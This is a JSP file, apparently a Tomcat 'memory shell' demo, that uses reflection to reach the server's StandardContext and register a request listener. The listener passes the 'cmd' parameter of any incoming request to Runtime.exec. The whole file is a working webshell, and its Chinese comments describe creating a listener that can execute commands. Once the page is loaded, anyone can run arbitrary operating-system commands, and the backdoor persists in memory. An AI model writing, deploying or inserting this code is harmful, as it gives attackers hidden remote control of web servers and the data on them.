<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%
    Object obj = request.getServletContext();
    java.lang.reflect.Field field = obj.getClass().getDeclaredField("context");
    field.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) field.get(obj);
    //获取ApplicationContext
    field = applicationContext.getClass().getDeclaredField("context");
    field.setAccessible(true);
    StandardContext standardContext = (StandardContext) field.get(applicationContext);
    //获取StandardContext
    ListenerDemo listenerdemo = new ListenerDemo();
    //创建能够执行命令的Listener
    standardContext.addApplicationEventListener(listenerdemo);
%>
<%!
    public class ListenerDemo implements ServletRequestListener {
        public void requestDestroyed(ServletRequestEvent sre) {
            System.out.println("requestDestroyed");
        }
        public void requestInitialized(ServletRequestEvent sre) {
            System.out.println("requestInitialized");
            try{
                String cmd = sre.getServletRequest().getParameter("cmd");
                Runtime.getRuntime().exec(cmd);
            }catch (Exception e ){
                //e.printStackTrace();
            }
        }
    }
%>